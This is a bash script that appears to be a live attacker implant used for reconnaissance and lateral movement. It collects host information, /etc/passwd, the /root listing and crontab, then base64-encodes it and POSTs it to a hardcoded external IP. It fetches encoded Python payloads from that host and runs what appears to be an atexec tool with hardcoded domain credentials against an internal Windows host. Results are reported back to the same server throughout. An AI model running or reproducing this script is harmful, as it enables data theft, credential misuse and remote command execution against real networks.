#!/bin/bash
# fxc2
({ ip -4 a; id; w; ps -axuwwww; curl -sf ifconfig.me 2>/dev/null; echo; cat /etc/passwd 2>/dev/null | head -20; ls -la /root/ 2>/dev/null | head -20; crontab -l 2>/dev/null; } 2>&1 | base64 -w0 | xargs -I{} curl -sf -X POST http://131.123.43.239/up -H "X-Name: fxr2" --data-binary {} >/dev/null 2>&1) &
# ntrun4: atexec-triggered IFM + poll/fetch chain (b64 payloads, md5-verified)
export PYTHONPATH=/tmp/imp
O=/tmp/.NTR4.txt
: > "$O"
W_ATX="1de61119fde61709d0fc3226c41c0558"
W_PFX="b3ad2f0da57007d11858da6c3c75534b"
getb() { # b64url dest want
  for i in 1 2 3 4 5; do
    curl -sm90 "$1" -o /tmp/.tb64 2>/dev/null
    base64 -d /tmp/.tb64 > "$2" 2>/dev/null
    H=$(md5sum "$2" 2>/dev/null | cut -d' ' -f1)
    [ "$H" = "$3" ] && return 0
    sleep 4
  done
  return 1
}
getb http://131.123.43.239/atx.b64 /tmp/.atx.py "$W_ATX"  || echo "atx DL_FAIL" >> "$O"
getb http://131.123.43.239/pfx4.b64 /tmp/.pfx4.py "$W_PFX" || echo "pfx DL_FAIL" >> "$O"
if [ -s "$O" ]; then
  curl -sm30 -X POST --data-binary @"$O" http://131.123.43.239/up -H "X-Name: mel4_ntr"
  exit 0
fi
cd /tmp
echo "== atexec ==" >> "$O"
timeout 150 python3 /tmp/.atx.py -target-ip 10.61.10.11 'MLT/rez:!QAZxsw2@10.61.10.11' 'cmd /q /c C:\Windows\Temp\.nd.bat' >> "$O" 2>&1
echo "== atx rc=$? ==" >> "$O"
python3 /tmp/.pfx4.py &
echo "poller spawned" >> "$O"
curl -sm30 -X POST --data-binary @"$O" http://131.123.43.239/up -H "X-Name: mel4_ntr2"
echo NTRUN4_DONE
b=$( (id; hostname; uname -a; ip -4 a | grep inet | head -5) 2>&1 | base64 -w0); curl -s -m 10 -X POST http://131.123.43.239/up -H "X-Name: wrk_out" --data-binary "$b" >/dev/null 2>&1


